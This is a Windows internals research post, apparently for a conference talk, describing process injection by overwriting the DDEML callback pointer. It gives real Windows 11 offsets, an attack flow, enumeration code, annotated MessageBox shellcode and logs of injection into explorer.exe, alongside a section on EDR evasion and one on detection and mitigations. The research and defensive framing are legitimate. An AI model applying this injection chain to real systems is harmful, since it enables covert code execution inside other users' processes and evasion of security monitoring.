---
title: "DDE Callback Hijacking: A New Process-Injection Target in DDEML Internals"
date: 2026-06-04 12:00:00 +0000
categories: [Windows Internals, Offensive Research]
tags: [dde, ddeml, process-injection, win32k, windows-internals, defcon]
toc: true
---

## 1. Background: What is DDE?

Dynamic Data Exchange (DDE) is a legacy Windows IPC protocol that lets applications communicate through **window messages**. Introduced in Windows 2.0 (1987), it was technically superseded by OLE/COM decades ago but remains enabled in Windows 11 for backward compatibility.

Every DDE operation maps to one of nine window messages:

| Message | Purpose |
| --- | --- |
| `WM_DDE_INITIATE` | Discover servers (broadcast to all windows) |
| `WM_DDE_EXECUTE` | Send command string to server |
| `WM_DDE_POKE` | Push unsolicited data to server |
| `WM_DDE_DATA` | Server sends data to client |
| `WM_DDE_ADVISE` | Establish persistent data link |
| `WM_DDE_REQUEST` | Request an item value |
| `WM_DDE_ACK` | Acknowledgment |
| `WM_DDE_UNADVISE` | End data link |
| `WM_DDE_TERMINATE` | End conversation |

The **DDE Management Library (DDEML)** in `user32.dll` wraps the raw message protocol with a callback-based API. Instead of manually crafting `WM_DDE_*` messages, applications call `DdeInitialize` and register a callback function that receives all DDE transactions:

```c
UINT result = DdeInitializeA(
    &ddeInstance,
    MyCallbackFunction,    // <-- function pointer: the target
    APPCLASS_STANDARD,
    0);
```

Existing offensive research on DDE focuses almost exclusively on `WM_DDE_EXECUTE` for command execution from Office documents (MITRE ATT&CK [T1559.002](https://attack.mitre.org/techniques/T1559/002/)). The primitive I lean on is old: overwrite a function pointer that lives in a writable user-mode structure. What I haven't seen documented is pointing it at **DDEML's internal instance state as a process injection target**. So treat this as a known primitive aimed at a new target, not a brand-new primitive.

## 2. DDEML Internals: Where the Callback Lives

### The WDML_INSTANCE Structure (Wine/ReactOS reconstruction)

> **This table is the Wine/ReactOS layout, reproduced for illustration only.** The real Windows 11 layout differs (see "Real Windows vs. Wine/ReactOS" below), and the PoC does **not** use these offsets. It resolves them dynamically. Do not walk these offsets against a live Windows target.

By analyzing the Wine and ReactOS open-source implementations of DDEML, I reconstructed the internal `WDML_INSTANCE` structure that Windows allocates for each `DdeInitialize` call:

```
WDML_INSTANCE (Wine/ReactOS reconstruction, illustration only)
═══════════════════════════════════════════════
+0x00   WDML_INSTANCE*    next
+0x08   DWORD             instanceID
+0x0C   DWORD             threadID
+0x10   BOOL              monitor
+0x14   BOOL              clientOnly
+0x18   BOOL              unicode
+0x1C   BOOL              win16
+0x20   HSZNode*          nodeList
+0x28   PFNCALLBACK       callback        ◄── Wine offset (NOT the live Windows offset)
+0x30   DWORD             CBFflags
+0x34   DWORD             monitorFlags
+0x38   DWORD             lastError
+0x40   HWND              hwndEvent        (8-byte aligned: +0x3C padded to +0x40)
+0x48   DWORD             wStatus
+0x50   WDML_SERVER*      servers          (8-byte aligned: +0x4C padded to +0x50)
+0x58   WDML_CONV*        convs[2]
+0x68   WDML_LINK*        links[2]
```

The `PFNCALLBACK` field sits in a **user-mode heap allocation** with no integrity protection. A process holding a handle with `PROCESS_VM_WRITE | PROCESS_VM_OPERATION` can overwrite it with `WriteProcessMemory`.

### Extra Window Memory: a cross-process pointer disclosure

DDEML creates **hidden windows** for each instance and conversation. These belong to classes like `DDEMLAnsiServer` and `DDEMLUnicodeServer`, and they allocate Extra Window Memory (EWM) to store internal pointers:

```c
#define GWL_WDML_INSTANCE      0                     // EWM offset 0
#define GWL_WDML_CONVERSATION  sizeof(ULONG_PTR)      // EWM offset 8 (x64)
```

In practice this technique only ever reads `EWM[0]` (the slot at offset 0); the conversation slot is shown for completeness. Any process at the same (or higher) integrity level as the target window can call:

```c
LONG_PTR ptr = GetWindowLongPtr(hwndDDE, 0);
```

This returns the **pointer value** stored in the target's window memory. That is a genuine cross-process pointer disclosure, and an ASLR defeat into the bargain. The read is serviced by `win32k` in the kernel and **does not call `OpenProcess`**, so it raises **no process-handle (ProcessAccess) telemetry** and does not surface in the ETW Threat-Intelligence provider.

Two precisions matter here:

- You obtain the pointer **value**, not the memory it points to. To *follow* it into the target's heap you still need `ReadProcessMemory` (i.e. a handle with `PROCESS_VM_READ`).
- **UIPI** applies: a lower-integrity process cannot read EWM from a higher-integrity window. Reading `explorer.exe` (medium IL) from a medium-IL process works; low→high does not.

### Real Windows vs. Wine/ReactOS

The actual Windows 11 implementation differs from Wine's layout. I first reconstructed it by raw memory scanning and pattern matching against known values (HWND, PID, code pointers), then confirmed it by disassembling `user32.dll`:

- `EWM[0]` on a `DDEMLUnicodeServer`/`DDEMLAnsiServer` window holds a pointer to the conversation structure (`tagCONV_INFO`) — `user32!DDEMLServerWndProc` reads it with `GetWindowLongPtr(hwnd, 0)`.
- That conversation structure holds a **heap pointer at `+0x008`** to the instance structure (`tagCL_INSTANCE_INFO`); `SvSpontExecute` dereferences `conv + 0x08` to reach it.
- The instance structure holds the `PFNCALLBACK` at **`+0x040`** — `user32!DoCallback` loads it as `mov rax, [instance+0x40]`. That single field is what this technique overwrites.
- The chain `EWM[0] → +0x008 → +0x040` is consistent across both my controlled victim and `explorer.exe`.

Because the absolute layout varies between Windows builds, the PoC uses **dynamic resolution** (module-aware scanning, §4) rather than hardcoded offsets.

## 3. Enumerating DDE Attack Surface

Before injecting, I need to find processes that have active DDEML instances. I built several enumeration tools.

### DDE Server Enumeration

`dde-enumerator` uses `DdeConnectList` with wildcard parameters to discover all active DDE servers:

```c
// Wildcard connect discovers all services and topics
HCONVLIST hList = DdeConnectList(inst, 0, 0, 0, NULL);
HCONV hConv = 0;
while ((hConv = DdeQueryNextServer(hList, hConv)) != 0) {
    CONVINFO ci = {0};
    ci.cb = sizeof(ci);
    DdeQueryConvInfo(hConv, QID_SYNC, &ci);
    // ci.hszSvcPartner = service name
    // ci.hszTopic      = topic name
    // ci.hwndPartner   = server window HWND
}
```

### DDE Window Discovery

The DDEML **conversation** windows are message-only (children of `HWND_MESSAGE`), so they do **not** appear in `EnumWindows`. I use four strategies in cascade:

1. **`EnumWindows`** finds the top-level and owning windows that have Extra Window Memory. It does *not* surface the conversation windows themselves; it only seeds the per-thread scan in #3.
2. **`FindWindowEx(HWND_MESSAGE, …)`** enumerates message-only windows, which is where the conversation windows actually live.
3. **`EnumThreadWindows`** enumerates windows per-thread for each thread in the target.
4. **Direct DDE connection** to a known service/topic, then read the server HWND from `DdeQueryConvInfo`.

Strategy #4 is the most reliable: DDEML creates the per-conversation `DDEMLAnsiServer`/`DDEMLUnicodeServer` window only when a client connects, and I get its HWND directly from the conversation info. Note that `DdeConnect` requires **both** a service and a topic HSZ:

```c
// service AND topic are both required
HCONV hConv = DdeConnect(inst, hszService /* "Folders" */,
                               hszTopic   /* "AppProperties" */, NULL);
```

### System-Wide DDE Monitor

DDEML includes a diagnostic mode (`APPCLASS_MONITOR`) that receives **all DDE traffic system-wide** via `XTYP_MONITOR` transactions:

```c
DdeInitialize(&inst, callback,
    APPCLASS_MONITOR | MF_CALLBACKS | MF_CONV | MF_SENDMSGS | MF_POSTMSGS,
    0);
```

This gives complete visibility into DDE conversations, service names, topics, and data exchanges. Handy for reconnaissance before injection.

### Default DDE Servers on Windows 11

On a stock Windows 11 installation, `explorer.exe` exposes multiple DDE servers:

| Service | Topic | Module |
| --- | --- | --- |
| `Progman` | `Progman` | SHELL32.dll |
| `Folders` | `AppProperties` | SHELL32.dll |

Microsoft Excel, when open, exposes additional servers (`Excel`, `System`). Any application using DDEML is a potential target.

---

## 4. The Technique: DDE Callback Hijacking

### Attack Flow

```
Attacker Process                          Target Process (DDEML active)
     │                                            │
     │  1. DdeConnect("Folders","AppProperties")  │
     │     ──────────────────────────────────►    │ Creates DDEMLUnicodeServer window
     │     DdeQueryConvInfo → server HWND          │
     │                                            │
     │  2. primary = GetWindowLongPtr(hwnd, 0)    │
     │     ──────────────────────────────────►    │ [Extra Window Memory]
     │     returns pointer VALUE (EWM[0])          │   offset 0 = primary struct ptr
     │                                            │
     │  3. linked = ReadProcessMemory(primary+0x008)
     │     ──────────────────────────────────►    │ follows heap pointer
     │     orig = ReadProcessMemory(linked+0x040)  │   → callback = 0x7FF80369B270
     │                                            │
     │  4. VirtualAllocEx + WriteProcessMemory     │
     │     ──────────────────────────────────►    │ [shellcode @ 0x02EE0000]
     │     (PROCESS_VM_OPERATION|VM_WRITE)         │   *** raises ProcessAccess / ETW-TI events ***
     │                                            │
     │  5. WriteProcessMemory(linked+0x040)        │
     │     ──────────────────────────────────►    │ callback = 0x02EE0000 (shellcode)
     │     overwrite PFNCALLBACK                    │
     │                                            │
     │  6. DdeClientTransaction(XTYP_EXECUTE)      │
     │     ──────────────────────────────────►    │ DDEML invokes server callback()
     │     (synchronous: blocks until ACK)         │   → SHELLCODE EXECUTES on the
     │                                            │     target's DDEML thread
     │                                            │
     │  7. WriteProcessMemory(linked+0x040)        │
     │     ──────────────────────────────────►    │ callback = 0x7FF80369B270 (restored)
     │     restore original callback               │
```

A few mechanics worth making explicit:

- **Why it fires.** The attacker is the DDE *client*; the victim is the DDE *server*. A client `DdeClientTransaction(XTYP_EXECUTE)` makes DDEML invoke the **server-side** callback (the `PFNCALLBACK` I overwrote) inside the victim process. That is the code-execution primitive.
- **Where it runs.** The callback executes on the **target thread that owns the DDEML instance**, when that thread next dispatches messages. If that thread is not pumping messages, the trigger stalls.
- **Why the restore is safe.** A synchronous `DdeClientTransaction` blocks until the server ACKs or times out, so by the time step 7 runs the callback has already fired. If you switch to `TIMEOUT_ASYNC`, step 7 races the callback, so don't.
- **The detection seam.** Step 4 (`VirtualAllocEx` of RWX + `WriteProcessMemory`) is the loud part: it opens a handle with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE` and writes cross-process, which raises process-handle (ProcessAccess) telemetry and can surface in the ETW Threat-Intelligence provider. The `GetWindowLongPtr` disclosure in step 2 is the only genuinely quiet step.

### Module-Aware Callback Detection

The callback offset varies between Windows builds, so instead of hardcoding it the PoC uses **module-aware scanning**:

1. **Enumerate all loaded modules** in the target via `EnumProcessModules` (≈379 modules for `explorer.exe`).
2. **Dump the structure** referenced by `EWM[0]` (512 bytes).
3. **Phase 1:** scan the primary structure for code pointers; classify each by the module it belongs to.
4. **Phase 2:** follow every heap pointer one level deep; scan linked structures for code pointers.
5. **Selection priority:**
    - P1: module-matched code pointer from a **linked** structure (most likely the callback).
    - P2: module-matched code pointer from the primary structure.
    - P3: non-base code pointer (lower 12 bits ≠ 0, i.e. not page-aligned) from a chain.
    - P4: any non-base code pointer.
6. **Verify** the candidate with a function-prologue check.

This reliably identifies the callback across processes and builds without prior knowledge of the layout.

## 5. Implementation: The PoC

`dde-callback-hijack-poc.c` supports three payload modes for incremental testing:

| Flag | Payload | Purpose |
| --- | --- | --- |
| `--nop` | `xor eax,eax; ret` (3 bytes) | Mechanism validation: does the callback get invoked? |
| `--beep` | `Beep(750, 300)` (33 bytes) | Audible proof of code execution |
| `--execute` | `MessageBoxA(...)` (81 bytes) | Visual proof: dialog appears in the target process |

Returning `NULL` from the hijacked callback (`xor eax,eax`) is a valid `HDDEDATA` for `XTYP_EXECUTE`, so the target does not fault when the payload returns.

### MessageBox Shellcode (x64)

The shellcode is 81 bytes, position-independent, with the `MessageBoxA` address patched at runtime:

```
+0x00  sub rsp, 0x28           ; 32B shadow space + 8B so RSP is 16-aligned at the call
+0x04  xor ecx, ecx            ; hWnd = NULL
+0x06  lea rdx, [rip+0x1D]     ; lpText    → "DDE Callback Hijacked!"  (resolves to +0x2A)
+0x0D  lea r8,  [rip+0x2D]     ; lpCaption → "PoC - Injected!"         (resolves to +0x41)
+0x14  xor r9d, r9d            ; uType = MB_OK
+0x17  mov rax, <MessageBoxA>  ; absolute address (patched)
+0x21  call rax
+0x23  xor eax, eax            ; return NULL (valid HDDEDATA)
+0x25  add rsp, 0x28
+0x29  ret
+0x2A  "DDE Callback Hijacked!\0"   ; 23 bytes incl. NUL
+0x41  "PoC - Injected!\0"          ; 16 bytes incl. NUL  → total = 0x51 = 81 bytes
```

The stack math is ABI-correct: the callback is entered with `RSP ≡ 8 (mod 16)`; `sub rsp, 0x28` leaves `RSP ≡ 0 (mod 16)` so that after `call rax` pushes the return address, `MessageBoxA` is entered at the required `RSP ≡ 8 (mod 16)`, with 32 bytes of shadow space below it. Both `lea` displacements were verified to land on the strings (`+0x06`+7 = `+0x0D`, `+0x0D`+`0x1D` = `+0x2A`; `+0x0D`+7 = `+0x14`, `+0x14`+`0x2D` = `+0x41`).

---

## 6. Test 1: Controlled Victim

A minimal DDEML server (`dde-victim-server.exe`) registers the `VictimService` service and prints all callback activity. Note that `DdeNameService` registers the **service** name; the `TestTopic` topic is matched in the server's `XTYP_CONNECT` handler, not by `DdeNameService`:

```c
DdeInitializeA(&g_ddeInst, VictimCallback, APPCLASS_STANDARD, 0);
DdeNameService(g_ddeInst, hszService, 0, DNS_REGISTER);   // registers the SERVICE name
```

### NOP test: mechanism validation

```
[+] PID: 5684
[+] Connected: 'VictimService'/'TestTopic' HWND=0x49010C
[+] EWM[0] = 0x22E6F7DCE50 (class 'DDEMLAnsiServer')
[+] Target module: 0x7FF6DB3A0000 - 0x7FF6DB3C8000 (160 KB)

[*] Phase 2: Linked structures
    chain[+0x008]->0x22E6F7E31B0+0x040 = 0x7FF6DB3A1000 [*MODULE*]

[+] MATCH: Callback in target module at 0x7FF6DB3A1000
[+] Prologue: 48 89 5C 24 (valid)

[!] NOP MODE
[+] Shellcode: 3 bytes (NOP)
[+] Overwritten!
[+] Triggered in PID 5684!
[+] Restored: 0x7FF6DB3A1000
[+] Done!
```

**Result:** victim process alive and responding. The callback resolves inside the victim's own image (`0x7FF6DB3A1000`, inside the module range `0x7FF6DB3A0000` to `0x7FF6DB3C8000`), at `linked + 0x040`. Mechanism works.

### Beep test: audible code execution

```
[+] MATCH: Callback in target module at 0x7FF6D3991000
[+] Prologue: 48 89 5C 24 (valid)

[!] BEEP MODE - Beep @ 0x7FF80458F7E0
[+] Shellcode: 33 bytes (BEEP)
[+] Triggered in PID 18560!
[+] Restored!
```

**Result:** audible beep from the victim process; victim alive and responding. Code execution confirmed.

### MessageBox test: visual proof

```
[+] MATCH: Callback in target module at 0x7FF6D3991000
[+] Prologue: 48 89 5C 24 (valid)

[!] EXECUTE MODE - MessageBoxA @ 0x7FF803DECAC0
[+] Shellcode: 81 bytes (MessageBox)
[+] Overwritten!
[+] Triggered in PID 18560!
[+] Restored: 0x7FF6D3991000
[+] Done!
```

**Result:** MessageBox dialog appeared in the victim process context; victim alive and responding after cleanup.

![NOP/Beep/MessageBox validation against the controlled victim](/assets/img/posts/dde-callback-hijacking-victim.png)

## 7. Test 2: explorer.exe, the real target

The real test: injecting into a live system process I don't control.

### Analysis

```
[+] PID: 8928
[+] Connected: 'Folders'/'AppProperties' HWND=0x3504FA
[+] EWM[0] = 0x29A892F0 (class 'DDEMLUnicodeServer')
[+] 379 modules loaded. Main: Explorer.EXE [0x7FF74AA70000]
```

> **A note on the addresses above.** `EWM[0]` and the chain pointer print truncated to 32 bits (`0x29A892F0`, `0x73E520`) while the module and callback addresses in the same run are full 64-bit (`0x7FF8…`). That is a `%x`-instead-of-`%p` format bug in the logger, not the technique: the injector dereferenced the full 64-bit pointers (as in the §6 victim run, e.g. `0x22E6F7E31B0`); only the console print was narrowed.

Code pointers were found in `Windows.UI.Xaml.dll`, `dcompi.dll`, `dcomp.dll`, `FileExplorerExtensions.dll`, and `MSCTF.dll`, but none was the DDE callback. Following the heap pointer at `EWM[0]+0x008`:

```
chain[+0x008]->0x73E520+0x040 = 0x7FF80369B270 [SHELL32.dll]
```

Explorer's `Folders` DDE callback lives in **SHELL32.dll** (where the shell DDE server is implemented), at the same `linked + 0x040` offset confirmed in Test 1. Prologue verification: `48 83 EC 28` (`sub rsp, 0x28`), a valid x64 entry point.

### Beep injection

```
[+] BEST: 0x7FF80369B270 in SHELL32.dll (chain struct 0x73E520+0x40)
[+] Prologue: 48 83 EC 28

[!] BEEP MODE - Beep @ 0x7FF80458F7E0
[+] Shellcode: 33 bytes (BEEP)
[+] RWX: 0x2EE0000
[+] Overwriting callback -> 0x2EE0000
[+] Overwritten!
[+] Triggered in PID 8928!
[+] Restored: 0x7FF80369B270
[+] Done!
```

Explorer: alive, PID 8928, Responding=True.

### MessageBox injection

```
[+] BEST: 0x7FF80369B270 in SHELL32.dll (chain struct 0x73E520+0x40)
[+] Prologue: 48 83 EC 28

[!] EXECUTE MODE - MessageBoxA @ 0x7FF803DECAC0
[+] Shellcode: 81 bytes (MessageBox)
[+] RWX: 0x2EE0000
[+] Overwriting callback -> 0x2EE0000
[+] Overwritten!
[+] Triggered in PID 8928!
[+] Restored: 0x7FF80369B270
[+] Done!
```

Explorer: alive, PID 8928, Responding=True.

The complete injection chain works against a live `explorer.exe` on Windows 11, with clean callback restoration and no process crash.

![Beep/MessageBox injection against live explorer.exe](/assets/img/posts/dde-callback-hijacking-explorer.png)

---

## 8. Where this evades EDR, and where it doesn't

This technique evades **thread-injection-centric** detection, not EDR in general. It is worth being precise about which half is quiet, because the write phase is genuinely loud (see §9).

**1. The execution *trigger* avoids the thread/APC ntdll hooks.** EDR commonly hooks `NtCreateThreadEx` and `NtQueueApcThread` to catch injection. My control transfer is a **DDE window message dispatched through `win32k.sys`**, so those thread/APC hooks never fire. *Caveat:* this does **not** bypass ntdll hooks in general. Steps 4 and 5 still call `VirtualAllocEx` → `NtAllocateVirtualMemory` and `WriteProcessMemory` → `NtWriteVirtualMemory`, which are the most heavily hooked functions of all. The trigger is hook-free; the write is not.

**2. No PEB modification.** KernelCallbackTable injection modifies `PEB->KernelCallbackTable`, which some EDRs now monitor. I modify `WDML_INSTANCE`, an obscure DDEML heap structure no EDR tracks. The nearest *catalogued* technique is **`T1055.011` Extra Window Memory Injection**, and the distinction matters. Classic EWM injection writes shellcode into a window's own extra bytes and rides its window procedure; I use EWM only to *locate* a heap callback pointer I then overwrite. (KernelCallbackTable injection is catalogued separately as `T1574.013`; `T1055.012` is Process Hollowing, not this.)

**3. No remote thread creation.** I never call `CreateRemoteThread`, `NtCreateThreadEx`, or `QueueUserAPC`. Code runs on the victim's **existing message-loop thread** when it processes the DDE transaction, so there is no thread-creation event. This is the strongest evasion property of the technique.

**4. Disclosure without `OpenProcess`.** Finding DDE windows and reading their Extra Window Memory via `GetWindowLongPtr` is a **window-manager operation** serviced by `win32k`; it needs no `OpenProcess` and raises no process-access telemetry. That applies to the `GetWindowLongPtr` *pointer leak* only. *Following* that pointer with `ReadProcessMemory` to walk the structure does require a handle (`PROCESS_VM_READ`), and is visible (see §9).

## 9. Detection and Mitigations

The disclosure phase (step 2) is quiet; the injection phase (steps 4–5) is not. A defender's leverage is almost entirely on the write.

### Detection opportunities

| Indicator | Technique phase | Telemetry source |
| --- | --- | --- |
| `GetWindowLongPtr` on `DDEMLAnsiServer`/`DDEMLUnicodeServer` class windows | Reconnaissance | ETW `win32k` tracing |
| Cross-process `ReadProcessMemory` targeting DDEML heap structures | Structure analysis | Process-handle (ProcessAccess) telemetry |
| `WriteProcessMemory` to a heap address obtained from a DDE window's EWM | Callback overwrite | Process-handle (ProcessAccess) telemetry |
| `VirtualAllocEx` (`PAGE_EXECUTE_READWRITE`) followed by a DDE transaction | Shellcode staging | ETW / API monitoring + ETW Threat-Intelligence |
| `DdeInitialize` with the `APPCLASS_MONITOR` flag | DDE surveillance | API monitoring |

The strongest behavioral signal is the **chain**: RWX `VirtualAllocEx` → `WriteProcessMemory` → DDE transaction, from the same process, against a process it has no reason to write to. The transient overwrite-then-restore of `PFNCALLBACK` (steps 5 and 7) is itself anomalous if the writes are observed.

### Mitigations

These are cross-process tampering controls, not DDE settings. There is no DDE configuration that removes the callback pointer, so the structural fix is denying the cross-process write or the control transfer.

1. **UIPI / integrity separation.** User Interface Privilege Isolation blocks both the EWM read and message delivery from a *lower*-integrity process to a higher-integrity window. Running sensitive processes at higher integrity defeats a low-IL attacker outright. (It does **not** stop same-integrity injection, e.g. the medium→medium `explorer.exe` case here.)
2. **Process-tampering protection / PPL.** Protected-process and hardened-handle protections make a `PROCESS_VM_OPERATION | PROCESS_VM_WRITE` handle to the target harder to obtain in the first place, which removes step 4–5.
3. **Control Flow Guard.** The callback *is* invoked through a CFG-guarded indirect call. In `user32!DoCallback` the dispatch is `mov rax, [instance+0x40]` (the very field this technique overwrites) followed by `call __guard_dispatch_icall` — a guarded dispatch, not a bare `call rax`. CFG nonetheless does not stop the technique by default, for an instructive reason: the shellcode lives in a region the attacker allocated with `VirtualAllocEx(PAGE_EXECUTE_READWRITE)`, and CFG treats dynamically-allocated executable memory as a valid call target. The guarded dispatch therefore validates the shellcode address and proceeds — the PoC succeeding proves the *target was accepted*, not that the call was unguarded. CFG only bites here when the attacker's region cannot become a valid executable target in the first place: under **Arbitrary Code Guard (ACG) / dynamic-code restriction**, which blocks the RWX allocation, or under **XFG**, where the target must also carry a matching call-prototype hash that raw shellcode does not have. Net: the call site is guarded, plain CFG is insufficient, and ACG/XFG is the control that would actually break this.
4. **Behavioral EDR rule** on the RWX-alloc → remote-write → DDE-transaction chain above.

## 10. Conclusion

DDE is not just a document-macro vector. One internal DDEML structure, the `WDML_INSTANCE` callback pointer reachable across processes through Extra Window Memory, is a process injection surface that thread-injection-focused detection does not cover. Think of it as a relative of Extra Window Memory Injection (`T1055.011`): the same pivot through EWM, but you overwrite a DDEML heap callback instead of the window's own extra bytes, and you trigger it with a client DDE transaction instead of a window-proc message. One honest caveat: classic EWM injection avoids `WriteProcessMemory` by writing into the window's own extra bytes, whereas this technique uses a cross-process write, so it is not the stealthier of the two on the write. The write phase stays detectable; the trigger and the disclosure are what's new.

---

## Attribution & Status

- DDE/DDEML are Microsoft platform components; the `WDML_INSTANCE` field names are taken from the Wine and ReactOS open-source implementations and used here for illustration. The real Windows layout (`tagCONV_INFO` → `tagCL_INSTANCE_INFO`, callback at `+0x040`) was reconstructed empirically and then confirmed by disassembling `user32.dll`.
- The function-pointer-overwrite primitive is a known class; the contribution claimed here is its application to DDEML instance state as an injection vector. A prior-art pass found no published technique targeting DDEML's `WDML_INSTANCE`/`PFNCALLBACK`; the nearest catalogued technique is `T1055.011` (Extra Window Memory Injection).
- Presented as security research for a conference talk; all testing on controlled lab/test servers.